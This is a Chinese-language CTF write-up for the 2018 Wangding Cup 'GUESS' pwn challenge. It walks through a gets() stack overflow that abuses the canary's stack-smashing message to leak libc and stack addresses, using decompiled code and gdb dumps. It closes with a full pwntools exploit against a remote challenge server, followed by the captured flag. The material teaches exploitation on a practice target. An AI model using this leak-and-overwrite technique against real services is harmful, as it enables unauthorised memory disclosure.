@@ -1,0 +1,393 @@
+---
+layout: post
+title:  guess
+date:   2021-06-26 00:01:01 +0300
+image:  2021-06-26-flower.jpg
+tags:   [ctf,Pwn,网鼎杯2018]
+---
+
+main
+
+```assembly
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]
+  int v5; // [rsp+1Ch] [rbp-84h]
+  __int64 v6; // [rsp+20h] [rbp-80h]
+  __int64 v7; // [rsp+28h] [rbp-78h]
+  char buf; // [rsp+30h] [rbp-70h]
+  char s2; // [rsp+60h] [rbp-40h]
+  unsigned __int64 v10; // [rsp+98h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  v7 = 3LL;
+  LODWORD(stat_loc.__uptr) = 0;
+  v6 = 0LL;
+  sub_4009A6(a1, a2, a3);
+  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0, a2);
+  if ( HIDWORD(stat_loc.__iptr) == -1 )
+  {
+    perror("./flag.txt");
+    _exit(-1);
+  }
+  read(SHIDWORD(stat_loc.__iptr), &buf, 0x30uLL);
+  close(SHIDWORD(stat_loc.__iptr));
+  puts("This is GUESS FLAG CHALLENGE!");
+  while ( 1 )
+  {
+    if ( v6 >= v7 )
+    {
+      puts("you have no sense... bye :-) ");
+      return 0LL;
+    }
+    v5 = sub_400A11();
+    if ( !v5 )
+      break;
+    ++v6;
+    wait((__WAIT_STATUS)&stat_loc);
+  }
+  puts("Please type your guessing flag");
+  gets(&s2);
+  if ( !strcmp(&buf, &s2) )
+    puts("You must have great six sense!!!! :-o ");
+  else
+    puts("You should take more effort to get six sence, and one more challenge!!");
+  return 0LL;
+}
+```
+
+- flag文件被读取到了栈上面
+- 主程序创建(`fork`)了三个线程
+- 在这个线程里面，程序将我们的输入和站上面的flag进行比较
+
+由于输入的时候调用了`gets`，导致栈溢出。而程序中没有`system`函数所以先泄露libc地址。
+
+程序开启了canary保护，**canary会对检查报错**
+
+```assembly
+void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+ __fortify_fail ("stack smashing detected");
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
+{
+ /* The loop is added only to keep gcc happy.  */
+ while (1)
+ __libc_message (2, "*** %s ***: %s terminated\n",
+ msg, __libc_argv[0] ?: "<unknown>");
+}
+```
+
+输出**__libc_argv[0]**来打印程序的名称，所以就可以从这里泄露一些信息。
+
+在libc中保存了一个函数叫_environ，存的是当前进程的环境变量
+
+gdb调试
+
+```assembly
+gdb-peda$ start
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x400a40 (push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffdf78 --> 0x7fffffffe2f8 ("XDG_VTNR=7")
+RSI: 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+RDI: 0x1 
+RBP: 0x400bb0 (push   r15)
+RSP: 0x7fffffffde88 --> 0x7ffff7a2d840 (<__libc_start_main+240>:	mov    edi,eax)
+RIP: 0x400a40 (push   rbp)
+R8 : 0x400c20 (repz ret)
+R9 : 0x7ffff7de7af0 (<_dl_fini>:	push   rbp)
+R10: 0x846 
+R11: 0x7ffff7a2d750 (<__libc_start_main>:	push   r14)
+R12: 0x4008b0 (xor    ebp,ebp)
+R13: 0x7fffffffdf60 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400a3b:	mov    eax,DWORD PTR [rbp-0x4]
+   0x400a3e:	leave  
+   0x400a3f:	ret    
+=> 0x400a40:	push   rbp
+   0x400a41:	mov    rbp,rsp
+   0x400a44:	sub    rsp,0xa0
+   0x400a4b:	mov    DWORD PTR [rbp-0x94],edi
+   0x400a51:	mov    QWORD PTR [rbp-0xa0],rsi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffde88 --> 0x7ffff7a2d840 (<__libc_start_main+240>:	mov    edi,eax)
+0008| 0x7fffffffde90 --> 0x1 
+0016| 0x7fffffffde98 --> 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+0024| 0x7fffffffdea0 --> 0x1f7ffcca0 
+0032| 0x7fffffffdea8 --> 0x400a40 (push   rbp)
+0040| 0x7fffffffdeb0 --> 0x0 
+0048| 0x7fffffffdeb8 --> 0xe50c3271fc8e0067 
+0056| 0x7fffffffdec0 --> 0x4008b0 (xor    ebp,ebp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Temporary breakpoint 1, 0x0000000000400a40 in ?? ()
+```
+
+在`if ( !strcmp(&buf, &s2) )`处下断点
+
+```assembly
+gdb-peda$ b *0x400B36
+Breakpoint 2 at 0x400b36
+gdb-peda$ r
+Starting program: /home/yqw/Documents/2021-06-26/GUESS 
+This is GUESS FLAG CHALLENGE!
+[New process 3499]
+Please type your guessing flag
+aaaaaaaaaa
+[Switching to process 3499]
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffde10 ("24sdfjkajslKSA\n")
+RBX: 0x0 
+RCX: 0x7ffff7dd18e0 --> 0xfbad2288 
+RDX: 0x7fffffffde40 ("aaaaaaaaaa")
+RSI: 0x7fffffffde40 ("aaaaaaaaaa")
+RDI: 0x7fffffffde10 ("24sdfjkajslKSA\n")
+RBP: 0x7fffffffde80 --> 0x400bb0 (push   r15)
+RSP: 0x7fffffffdde0 --> 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+RIP: 0x400b36 (call   0x400820 <strcmp@plt>)
+R8 : 0x60301b --> 0x0 
+R9 : 0x0 
+R10: 0x7ffff7dd1b78 --> 0x603410 --> 0x0 
+R11: 0x246 
+R12: 0x4008b0 (xor    ebp,ebp)
+R13: 0x7fffffffdf60 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400b2c:	lea    rax,[rbp-0x70]
+   0x400b30:	mov    rsi,rdx
+   0x400b33:	mov    rdi,rax
+=> 0x400b36:	call   0x400820 <strcmp@plt>
+   0x400b3b:	test   eax,eax
+   0x400b3d:	jne    0x400b4b
+   0x400b3f:	mov    edi,0x400c90
+   0x400b44:	call   0x4007c0 <puts@plt>
+Guessed arguments:
+arg[0]: 0x7fffffffde10 ("24sdfjkajslKSA\n")
+arg[1]: 0x7fffffffde40 ("aaaaaaaaaa")
+arg[2]: 0x7fffffffde40 ("aaaaaaaaaa")
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdde0 --> 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+0008| 0x7fffffffdde8 --> 0x100000000 
+0016| 0x7fffffffddf0 --> 0x0 
+0024| 0x7fffffffddf8 --> 0x3 
+0032| 0x7fffffffde00 --> 0x0 
+0040| 0x7fffffffde08 --> 0x3 
+0048| 0x7fffffffde10 ("24sdfjkajslKSA\n")
+0056| 0x7fffffffde18 --> 0xa41534b6c736a ('jslKSA\n')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Thread 2.1 "GUESS" hit Breakpoint 2, 0x0000000000400b36 in ?? () 
+```
+
+查看栈中信息
+
+```assembly
+gdb-peda$ stack 64
+0000| 0x7fffffffdde0 --> 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+0008| 0x7fffffffdde8 --> 0x100000000 
+0016| 0x7fffffffddf0 --> 0x0 
+0024| 0x7fffffffddf8 --> 0x3 
+0032| 0x7fffffffde00 --> 0x0 
+0040| 0x7fffffffde08 --> 0x3 
+0048| 0x7fffffffde10 ("24sdfjkajslKSA\n")
+0056| 0x7fffffffde18 --> 0xa41534b6c736a ('jslKSA\n')
+0064| 0x7fffffffde20 --> 0x1 
+0072| 0x7fffffffde28 --> 0x7fffffffdea0 --> 0x1f7ffcca0 
+0080| 0x7fffffffde30 --> 0x7ffff7ffe168 --> 0x0 
+0088| 0x7fffffffde38 --> 0xf0b5ff 
+0096| 0x7fffffffde40 ("aaaaaaaaaa")
+0104| 0x7fffffffde48 --> 0x6161 ('aa')
+0112| 0x7fffffffde50 --> 0x7fffffffde7e --> 0x400bb024c6 
+0120| 0x7fffffffde58 --> 0x0 
+0128| 0x7fffffffde60 --> 0x400bb0 (push   r15)
+0136| 0x7fffffffde68 --> 0x4008b0 (xor    ebp,ebp)
+0144| 0x7fffffffde70 --> 0x7fffffffdf60 --> 0x1 
+0152| 0x7fffffffde78 --> 0x24c66129b5643200 
+0160| 0x7fffffffde80 --> 0x400bb0 (push   r15)
+0168| 0x7fffffffde88 --> 0x7ffff7a2d840 (<__libc_start_main+240>:	mov    edi,eax)
+0176| 0x7fffffffde90 --> 0x1 
+0184| 0x7fffffffde98 --> 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+0192| 0x7fffffffdea0 --> 0x1f7ffcca0 
+0200| 0x7fffffffdea8 --> 0x400a40 (push   rbp)
+0208| 0x7fffffffdeb0 --> 0x0 
+0216| 0x7fffffffdeb8 --> 0xe10c369b00967c2d 
+0224| 0x7fffffffdec0 --> 0x4008b0 (xor    ebp,ebp)
+0232| 0x7fffffffdec8 --> 0x7fffffffdf60 --> 0x1 
+0240| 0x7fffffffded0 --> 0x0 
+0248| 0x7fffffffded8 --> 0x0 
+0256| 0x7fffffffdee0 --> 0x1ef3c9e4aad67c2d 
+0264| 0x7fffffffdee8 --> 0x1ef3d95eb8067c2d 
+0272| 0x7fffffffdef0 --> 0x0 
+0280| 0x7fffffffdef8 --> 0x0 
+0288| 0x7fffffffdf00 --> 0x0 
+0296| 0x7fffffffdf08 --> 0x7fffffffdf78 --> 0x7fffffffe2f8 ("XDG_VTNR=7")
+0304| 0x7fffffffdf10 --> 0x7ffff7ffe168 --> 0x0 
+0312| 0x7fffffffdf18 --> 0x7ffff7de780b (<_dl_init+139>:	jmp    0x7ffff7de77e0 <_dl_init+96>)
+0320| 0x7fffffffdf20 --> 0x0 
+0328| 0x7fffffffdf28 --> 0x0 
+0336| 0x7fffffffdf30 --> 0x4008b0 (xor    ebp,ebp)
+0344| 0x7fffffffdf38 --> 0x7fffffffdf60 --> 0x1 
+0352| 0x7fffffffdf40 --> 0x0 
+0360| 0x7fffffffdf48 --> 0x4008d9 (hlt)
+0368| 0x7fffffffdf50 --> 0x7fffffffdf58 --> 0x1c 
+0376| 0x7fffffffdf58 --> 0x1c 
+0384| 0x7fffffffdf60 --> 0x1 
+0392| 0x7fffffffdf68 --> 0x7fffffffe2d3 ("/home/yqw/Documents/2021-06-26/GUESS")
+0400| 0x7fffffffdf70 --> 0x0 
+0408| 0x7fffffffdf78 --> 0x7fffffffe2f8 ("XDG_VTNR=7")
+0416| 0x7fffffffdf80 --> 0x7fffffffe303 ("XDG_SESSION_ID=c2")
+0424| 0x7fffffffdf88 --> 0x7fffffffe315 ("XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/yqw")
+0432| 0x7fffffffdf90 --> 0x7fffffffe344 ("CLUTTER_IM_MODULE=xim")
+0440| 0x7fffffffdf98 --> 0x7fffffffe35a ("SESSION=ubuntu")
+0448| 0x7fffffffdfa0 --> 0x7fffffffe369 ("GPG_AGENT_INFO=/home/yqw/.gnupg/S.gpg-agent:0:1")
+0456| 0x7fffffffdfa8 --> 0x7fffffffe399 ("VTE_VERSION=4205")
+0464| 0x7fffffffdfb0 --> 0x7fffffffe3aa ("XDG_MENU_PREFIX=gnome-")
+0472| 0x7fffffffdfb8 --> 0x7fffffffe3c1 ("SHELL=/bin/bash")
+0480| 0x7fffffffdfc0 --> 0x7fffffffe3d1 ("TERM=xterm-256color")
+0488| 0x7fffffffdfc8 --> 0x7fffffffe3e5 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")
+0496| 0x7fffffffdfd0 --> 0x7fffffffe408 ("WINDOWID=4198107")
+0504| 0x7fffffffdfd8 --> 0x7fffffffe419 ("GNOME_KEYRING_CONTROL=")
+```
+
+0x7fffffffdf68-0x7fffffffde40=0x128
+
+得到 _libc_arg[0]的偏移量，将 _libc_arg[0]覆盖为某个函数的got表地址。
+
+在libc中保存了一个函数叫_environ，存的是当前进程的环境变量，泄露\_libc_arg的表头environ，从而找到flag在站上面的地址
+
+```assembly
+gdb-peda$ stack 64
+0000| 0x7fffffffdde0 --> 0x7fffffffdf68 --> 0x7fffffffe2d2 ("/home/yqw/Documents/2021-06-26/GUESS")
+0008| 0x7fffffffdde8 --> 0x100000000 
+0016| 0x7fffffffddf0 --> 0x0 
+0024| 0x7fffffffddf8 --> 0x3 
+0032| 0x7fffffffde00 --> 0x0 
+0040| 0x7fffffffde08 --> 0x3 
+0048| 0x7fffffffde10 ("24sdfjkajslKSA\n")
+0056| 0x7fffffffde18 --> 0xa41534b6c736a ('jslKSA\n')
+0064| 0x7fffffffde20 --> 0x1 
+0072| 0x7fffffffde28 --> 0x7fffffffdea0 --> 0x1f7ffcca0 
+0080| 0x7fffffffde30 --> 0x7ffff7ffe168 --> 0x0 
+0088| 0x7fffffffde38 --> 0xf0b5ff 
+0096| 0x7fffffffde40 ("aaaaaaaa")
+0104| 0x7fffffffde48 --> 0x400b00 (jl     0x400b01)
+0112| 0x7fffffffde50 --> 0x7fffffffde7e --> 0x400bb0fadf 
+0120| 0x7fffffffde58 --> 0x0 
+0128| 0x7fffffffde60 --> 0x400bb0 (push   r15)
+0136| 0x7fffffffde68 --> 0x4008b0 (xor    ebp,ebp)
+0144| 0x7fffffffde70 --> 0x7fffffffdf60 --> 0x1 
+0152| 0x7fffffffde78 --> 0xfadf5c0ff1d69e00 
+0160| 0x7fffffffde80 --> 0x400bb0 (push   r15)
+0168| 0x7fffffffde88 --> 0x7ffff7a2d840 (<__libc_start_main+240>:	mov    edi,eax)
+0176| 0x7fffffffde90 --> 0x1 
+0184| 0x7fffffffde98 --> 0x7fffffffdf68 --> 0x7fffffffe2d2 ("/home/yqw/Documents/2021-06-26/GUESS")
+0192| 0x7fffffffdea0 --> 0x1f7ffcca0 
+--More--(25/64)
+0200| 0x7fffffffdea8 --> 0x400a40 (push   rbp)
+0208| 0x7fffffffdeb0 --> 0x0 
+0216| 0x7fffffffdeb8 --> 0xea429cad4c5ebadb 
+0224| 0x7fffffffdec0 --> 0x4008b0 (xor    ebp,ebp)
+0232| 0x7fffffffdec8 --> 0x7fffffffdf60 --> 0x1 
+0240| 0x7fffffffded0 --> 0x0 
+0248| 0x7fffffffded8 --> 0x0 
+0256| 0x7fffffffdee0 --> 0x15bd63d2e61ebadb 
+0264| 0x7fffffffdee8 --> 0x15bd7368f4cebadb 
+0272| 0x7fffffffdef0 --> 0x0 
+0280| 0x7fffffffdef8 --> 0x0 
+0288| 0x7fffffffdf00 --> 0x0 
+0296| 0x7fffffffdf08 --> 0x7fffffffdf78 --> 0x7fffffffe2f7 ("XDG_VTNR=7")
+0304| 0x7fffffffdf10 --> 0x7ffff7ffe168 --> 0x0 
+0312| 0x7fffffffdf18 --> 0x7ffff7de780b (<_dl_init+139>:	jmp    0x7ffff7de77e0 <_dl_init+96>)
+0320| 0x7fffffffdf20 --> 0x0 
+0328| 0x7fffffffdf28 --> 0x0 
+0336| 0x7fffffffdf30 --> 0x4008b0 (xor    ebp,ebp)
+0344| 0x7fffffffdf38 --> 0x7fffffffdf60 --> 0x1 
+0352| 0x7fffffffdf40 --> 0x0 
+0360| 0x7fffffffdf48 --> 0x4008d9 (hlt)
+0368| 0x7fffffffdf50 --> 0x7fffffffdf58 --> 0x1c 
+0376| 0x7fffffffdf58 --> 0x1c 
+0384| 0x7fffffffdf60 --> 0x1 
+0392| 0x7fffffffdf68 --> 0x7fffffffe2d2 ("/home/yqw/Documents/2021-06-26/GUESS")
+--More--(50/64)
+0400| 0x7fffffffdf70 --> 0x0 
+0408| 0x7fffffffdf78 --> 0x7fffffffe2f7 ("XDG_VTNR=7")
+0416| 0x7fffffffdf80 --> 0x7fffffffe302 ("XDG_SESSION_ID=c2")
+0424| 0x7fffffffdf88 --> 0x7fffffffe314 ("XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/yqw")
+0432| 0x7fffffffdf90 --> 0x7fffffffe343 ("CLUTTER_IM_MODULE=xim")
+0440| 0x7fffffffdf98 --> 0x7fffffffe359 ("SESSION=ubuntu")
+0448| 0x7fffffffdfa0 --> 0x7fffffffe368 ("GPG_AGENT_INFO=/home/yqw/.gnupg/S.gpg-agent:0:1")
+0456| 0x7fffffffdfa8 --> 0x7fffffffe398 ("VTE_VERSION=4205")
+0464| 0x7fffffffdfb0 --> 0x7fffffffe3a9 ("XDG_MENU_PREFIX=gnome-")
+0472| 0x7fffffffdfb8 --> 0x7fffffffe3c0 ("SHELL=/bin/bash")
+0480| 0x7fffffffdfc0 --> 0x7fffffffe3d0 ("TERM=xterm-256color")
+0488| 0x7fffffffdfc8 --> 0x7fffffffe3e4 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")
+0496| 0x7fffffffdfd0 --> 0x7fffffffe407 ("WINDOWID=4194314")
+0504| 0x7fffffffdfd8 --> 0x7fffffffe418 ("GNOME_KEYRING_CONTROL=")
+
+gdb-peda$ print &_environ
+$2 = (char ***) 0x7ffff7ffe100 <environ>
+
+gdb-peda$ print _environ
+$3 = (char **) 0x7fffffffdf78
+
+gdb-peda$ x/a _environ
+0x7fffffffdf78:	0x7fffffffe2f7
+
+gdb-peda$ x/s 0x7fffffffe2f7
+0x7fffffffe2f7:	"XDG_VTNR=7"
+```
+
+0x7fffffffdf78-0x7fffffffde10=0x168
+
+得到flag在栈上的地址。
+
+```assembly
+from pwn import *
+# from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 27426)
+# io = process("./GUESS")
+libc = ELF("./libc-2.23.so")
+
+read_got = 0x602040
+
+payload = "a"*0x128 + p64(read_got)
+io.sendline(payload)
+
+io.recvuntil("*** stack smashing detected ***: ")
+addr = u64(io.recv(7)[:-1].ljust(8, "\x00"))
+print(hex(addr))
+
+# libc = LibcSearcher("read", addr)
+base = addr - libc.symbols["read"]
+system = base + libc.symbols["system"]
+environ = base + libc.symbols["__environ"]
+
+payload = "b"*0x128 + p64(environ)
+io.sendlineafter("Please type your guessing flag\n", payload)
+env = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
+print(hex(env))
+
+payload = "c"*0x128 + p64(env-0x168)
+io.sendlineafter("Please type your guessing flag\n",payload)
+io.recvuntil("*** stack smashing detected ***: ")
+
+
+# gdb.attach(io)
+# raw_input()
+
+io.interactive()
+```
+
+flag{3eb1ae69-cc7c-4dc9-bc7a-1a9deb9ea9f4}
